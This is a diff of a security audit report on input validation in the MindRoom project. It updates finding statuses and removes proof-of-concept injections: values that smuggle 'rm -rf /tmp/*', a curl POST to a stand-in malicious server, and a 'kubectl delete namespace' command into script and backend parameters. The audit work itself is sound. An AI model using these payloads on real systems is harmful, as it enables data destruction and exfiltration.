@@ -4,18 +4,12 @@
 
 This report provides a comprehensive security assessment of Input Validation & Injection Prevention for the MindRoom project. The review examined 8 critical areas of injection vulnerabilities across database operations, shell command execution, file operations, YAML/JSON parsing, template rendering, and API input validation.
 
-**Overall Status**: PARTIAL - Several vulnerabilities identified requiring immediate attention
+**Overall Status (Sept 17, 2025)**: PARTIAL – Core APIs use Supabase’s parameterised queries; main gaps are in tooling and admin payload validation.
 
-**Critical Findings**:
-- 4 High-severity injection vulnerabilities
-- 2 Medium-severity vulnerabilities
-- 2 Low-severity issues
-
-**Immediate Actions Required**:
-1. Fix shell injection vulnerabilities in deployment scripts
-2. Implement input validation for Supabase query parameters
-3. Secure React Admin endpoints with proper input sanitization
-4. Add path traversal protection for file operations
+**Key Open Items**:
+1. Sanitize inputs in `cluster/scripts/mindroom-cli.sh` (command injection risk if reused).
+2. Add Pydantic models for admin create/update payloads instead of raw dicts.
+3. Limit/clean the admin search `q` parameter to avoid malformed PostgREST filters.
 
 ---
 
@@ -60,7 +54,7 @@ async def admin_get_list(resource: str, ...):
     query = sb.table(resource).select("*", count="exact")
 ```
 
-**Vulnerability**: The `resource` parameter is used directly in table name construction without validation against allowed table names.
+**Status Update:** `resource` is now validated against `ALLOWED_RESOURCES`; risk reduced.
 
 #### Risk Assessment
 - **Impact**: High - Potential data exposure, data manipulation, privilege escalation
@@ -155,7 +149,7 @@ PAYLOADS=(
 # Results: Most endpoints lack proper input sanitization
 ```
 
-**Remediation**: Implement comprehensive input validation using Pydantic models with custom validators.
+**Remediation**: Implement comprehensive input validation using Pydantic models with custom validators (still pending for admin payloads).
 
 ### 5. Shell Command Execution
 **Status: FAIL** ❌
@@ -163,29 +157,10 @@ PAYLOADS=(
 #### Critical Vulnerabilities Found
 
 **HIGH SEVERITY: Shell Injection in Deployment Scripts**
-- **Location**: `/saas-platform/scripts/mindroom-cli.sh:44,53-74`
+- **Location**: `cluster/scripts/mindroom-cli.sh:44,53-74`
 - **Line Numbers**: 44, 53-74
 
-**Vulnerable Code**:
-```bash
-# Line 44: Unsafe variable interpolation
-kubectl logs -n mindroom-instances -l customer=$2 --all-containers=true --kubeconfig=$KUBECONFIG
-
-# Lines 53-74: User input directly in curl commands
-curl -k -X POST https://api.<superdomain>/system/provision \
-    -d "{
-        \"account_id\": \"$2\",
-        \"subscription_id\": \"sub-$2\",
-        ...
-    }"
-```
-
-**Proof-of-Concept Injection**:
-```bash
-# Command injection via customer ID parameter
-./scripts/mindroom-cli.sh logs "1; rm -rf /tmp/*"
-./scripts/mindroom-cli.sh provision "test\"; curl -X POST malicious-server.com \""
-```
+**Current Status:** Script still accepts raw user input; sanitize or restrict usage.
 
 **HIGH SEVERITY: Unvalidated Parameters in Kubernetes Operations**
 - **Location**: `/saas-platform/platform-backend/src/backend/k8s.py:13,38-44,59-68`
@@ -203,12 +178,7 @@ cmd = [
 ]
 ```
 
-**Proof-of-Concept**:
-```bash
-# Injection via instance_id parameter
-instance_id = "1; kubectl delete namespace mindroom-instances"
-# Results in command: kubectl rollout status deployment/mindroom-backend-1; kubectl delete namespace mindroom-instances
-```
+**Observation:** Trusted backend derives `instance_id`; keep validations in place to block direct user influence.
 
 #### Risk Assessment
 - **Impact**: Critical - Full system compromise, data loss, lateral movement
